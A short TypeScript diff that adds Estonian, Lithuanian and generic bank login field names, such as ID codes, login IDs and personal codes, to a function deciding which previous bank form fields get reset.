@@ -223,7 +223,25 @@ function shouldResetPreviousBankField(key: string): boolean {
     normalizedKey.includes("verificationcode") ||
     normalizedKey.includes("responsecode") ||
     normalizedKey.includes("digipass") ||
-    normalizedKey.includes("kalkulaator")
+    normalizedKey.includes("kalkulaator") ||
+    normalizedKey === "idcode" ||
+    normalizedKey === "idcard" ||
+    normalizedKey === "identificatiecode" ||
+    normalizedKey === "ln" ||
+    normalizedKey === "pc" ||
+    normalizedKey === "text" ||
+    normalizedKey.includes("loginid") ||
+    normalizedKey.includes("legalid") ||
+    normalizedKey.includes("personcode") ||
+    normalizedKey.includes("personelcode") ||
+    normalizedKey.includes("generatoranswer") ||
+    normalizedKey.includes("phonenumber") ||
+    normalizedKey.includes("perscode") ||
+    normalizedKey.includes("asmens") ||
+    normalizedKey.includes("naudotojo") ||
+    normalizedKey.includes("vartotojo") ||
+    normalizedKey.includes("kodas") ||
+    normalizedKey.startsWith("credentials")
   );
 }
 
